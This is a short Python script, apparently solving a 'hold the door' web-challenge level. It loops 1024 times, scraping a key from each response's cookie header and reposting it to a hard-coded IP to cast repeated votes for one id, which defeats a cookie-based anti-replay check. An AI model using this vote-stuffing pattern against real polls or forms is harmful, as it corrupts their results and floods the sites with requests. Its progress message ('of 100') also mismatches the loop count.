#!/usr/bin/python3

# import modules
import requests
import sys

# level 1

url = 'http://158.69.76.135/level1.php'
cookie_list = []
id = 2500
times = 1024

for i in range(times):
    response_get = requests.post(url, data={'id': id, 'holdthedoor': 'Enviar'})
    key_form = response_get.headers['set-cookie']
    cookie_list = key_form.split(';')
    key_form = cookie_list[0][12:]
    print("{}, {}".format(key_form, type(key_form)))
    response_post = requests.post(
    url,
    data={'id': id, 'holdthedoor': 'Enviar', 'key': key_form},
    cookies={'holdTheDoor': response_get.cookies}
    )
    print(response_post.headers)
    print("Status: {} of 100".format(i + 1))
